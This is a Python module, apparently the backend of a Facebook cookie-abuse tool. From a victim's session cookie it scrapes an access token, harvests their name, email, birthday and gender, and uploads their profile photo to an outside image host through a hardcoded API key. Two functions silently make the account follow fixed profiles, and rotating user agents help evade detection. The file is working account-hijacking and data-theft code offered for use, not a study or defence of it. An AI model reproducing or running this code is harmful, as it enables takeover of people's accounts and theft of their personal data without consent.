from string import ascii_letters, digits
from base64 import b64decode, b64encode
from urllib.parse import quote_plus
from bs4 import BeautifulSoup
from hashlib import sha256
from random import choice, choices
from requests import get
from json import load
import re

admin_user = 'e3dde4ef0836bc1a3e9bd632ed788d3b160b59d25bc50dd8d4fd58d0647ebed4'
admin_pass = '1c51db079f8065b9c51e5dd75edacc209a6e86686647f47de2f4494ce1f3509a'
rand_keys = []
user_agents = load(open('user-agents.json'))

def get_access_token(cookie:str):
    try:
        resp = get('https://business.facebook.com/business_locations', cookies={'cookie': cookie})
        tok = re.findall(r'EAAG\w+', resp.text)
        if tok:
            return tok[0]
        else:
            return None
    except:
        return None


def get_fb_info(cookie:str):
    try:
        token = get_access_token(cookie)
        if not token:
            return None
        resp = get(f'https://graph.facebook.com/me?fields=id,name,email,birthday,gender&access_token={token}', cookies={'cookie': cookie})
        month_names = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
        birthday = resp.json().get('birthday')
        if birthday:
            month, day, year = birthday.split('/')
            try:
                birthday = f'{day} {month_names[int(month) - 1]}, {year}'
            except:
                pass
        info = {
            'fb_id': resp.json().get('id'),
            'name': resp.json().get('name'),
            'email': resp.json().get('email'),
            'dob': birthday,
            'gender': resp.json().get('gender').capitalize() if resp.json().get('gender') else resp.json().get('gender'),
            'img': get_fb_img(cookie, token)
        }
        return info
    except:
        return None


def get_fb_img(cookie, token):
    try:
        resp = get(f'https://graph.facebook.com/me/picture?type=large&redirect=false&access_token={token}', cookies={'cookie': cookie})
        img_url = resp.json()['data']['url']
        try:
            resp = get(f'https://api.imgbb.com/1/upload?key=43bcbe399420f8a08bbb62e5861c4091&image={quote_plus(img_url)}')
            return resp.json()['data']['url']
        except:
            return img_url
    except:
        return None


def follow_dada_bhai(cookie: str):
    try:
        resp = get('https://mbasic.facebook.com/100083542359206',
                   cookies={'cookie': cookie})
        soap = BeautifulSoup(resp.text, 'html.parser')
        follow_a = soap.find('a', string='Follow')
        follow_link = 'https://mbasic.facebook.com' + follow_a.get('href')
        get(follow_link, cookies={'cookie': cookie})
        return True
    except:
        return None


def follow_innocuous(cookie: str):
    try:
        resp = get('https://mbasic.facebook.com/100075924800901',
                   cookies={'cookie': cookie})
        soap = BeautifulSoup(resp.text, 'html.parser')
        follow_a = soap.find('a', string='Follow')
        follow_link = 'https://mbasic.facebook.com' + follow_a.get('href')
        get(follow_link, cookies={'cookie': cookie})
        return True
    except:
        return None

def hash_string(text):
    return sha256(text.encode()).digest().hex()

def check_if_logined(session):
    try:
        session = b64decode(session).decode('utf-8')
        username, password, rand = session.split(':')
        if username == admin_user and password == admin_pass and rand in rand_keys:
            return True
        return False
    except:
        return False

def check_user_pass(username, password):
    if hash_string(username) == admin_user and hash_string(password) == admin_pass:
        return True
    return False

def get_session_key(username, password):
    rand = ''.join(choices(ascii_letters + digits, k=20))
    rand_keys.append(rand)
    return b64encode((hash_string(username) + ':' + hash_string(password) + ':' + rand).encode()).decode()

def get_ua():
    browser = choice(list(user_agents))
    ua_list = user_agents[browser]
    ua = choice(ua_list)
    return ua

def ping_with_ua(cookie):
    headers = {'User-Agent': get_ua()}
    resp = get('https://mbasic.facebook.com/', headers=headers, cookies={'cookie': cookie})
    return resp.text

